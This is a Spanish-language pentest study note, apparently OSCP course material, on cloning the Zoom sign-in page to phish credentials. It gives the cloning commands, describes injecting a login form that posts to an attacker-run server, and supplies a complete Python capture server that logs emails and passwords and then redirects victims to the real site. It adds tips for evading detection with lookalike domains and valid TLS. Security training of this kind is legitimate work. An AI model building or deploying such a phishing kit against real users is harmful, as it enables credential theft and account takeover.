---
tipo: tecnica
fase: explotacion
so: [linux]
tags: [oscp, tecnica, explotacion, phishing, social-engineering]
fecha: 2026-09-28
---

# Website Cloning para Credential Phishing

> [!abstract] Qué es y cuándo usarla
> Clonar la página de login de un servicio conocido (Zoom, Gmail, Microsoft…) para **robar credenciales**. El clon captura usuario/contraseña y redirige a la web real para simular un fallo de login. Vector típico de **acceso inicial** en un phishing.

## Requisitos previos
- Kali con `single-file-cli` (mejor que `wget` para páginas con JS).
- Un pretexto y un medio de entrega (email desde cuenta comprometida o dominio lookalike).
- En real: **IP pública / dominio lookalike + HTTPS válido** (no `127.0.0.1`).

## 1. Clonar la página
`wget` sirve para HTML/CSS estático pero **no captura la lógica JS** y puede disparar alertas (CSRFGuard):
```bash
mkdir ZoomSignin && cd ZoomSignin
wget -E -k -K -p -e robots=off -nd "https://zoom.us/signin#/login"
```
| Flag | Qué hace |
|---|---|
| `-E` | Extensión según MIME |
| `-k` | Enlaces a locales |
| `-K` | Guarda `.orig` |
| `-p` | Todo lo necesario para la página |
| `-e robots=off` | Ignora robots.txt |
| `-nd` | Sin árbol de directorios |

Mejor **SingleFile CLI** (renderiza con Chromium, embebe todo en un HTML):
```bash
sudo apt install nodejs npm chromium -y
sudo npm install -g single-file-cli
single-file "https://zoom.us/signin" signin.html --browser-executable-path /usr/bin/chromium
```

## 2. Arreglar el formulario (los inputs no funcionan tras clonar)
Localizar el botón de submit y engancharle nuestra lógica:
```bash
grep -oP '.{0,100}Next</span>' signin.html      # -> id del botón (ej. signin_btn_next)
```
Script Python (BeautifulSoup) que: elimina banners de cookies rotos, añade `onclick`/Enter al botón, e inyecta un **overlay de password** cuyo `<form action>` apunta a **nuestro servidor** de captura (`http://<KALI>:8080/creds`).

## 3. Servidor de captura de credenciales
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        d = parse_qs(self.rfile.read(n).decode())
        print(f"[+] {d.get('email',[''])[0]} : {d.get('password',[''])[0]}")
        self.send_response(302)
        self.send_header('Location', 'https://zoom.us/signin')   # redirige a la web real
        self.end_headers()
    def do_GET(self):
        self.send_response(200); self.end_headers()
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
```
```bash
python3 cred_server.py               # captura en :8080
sudo python3 -m http.server 80       # sirve el clon en :80
```

> [!warning] Detección / problemas
> - `wget` no preserva la lógica JS (Vue/React) → usa SingleFile.
> - **Password managers** solo autorrellenan en el dominio real → un usuario que dependa de ellos no picará. Usa dominios lookalike/homoglyph.
> - Sitios sin **HTTPS válido** → warning del navegador. Consigue TLS.
> - En engagement real: cambia `127.0.0.1` por la IP de Kali en el `form action` y en el listener.

## Visto en
- Módulo: [[11 - Phishing Basics]]
- Cheatsheet: [[Password Attacks]]
- Máquinas: [[]]
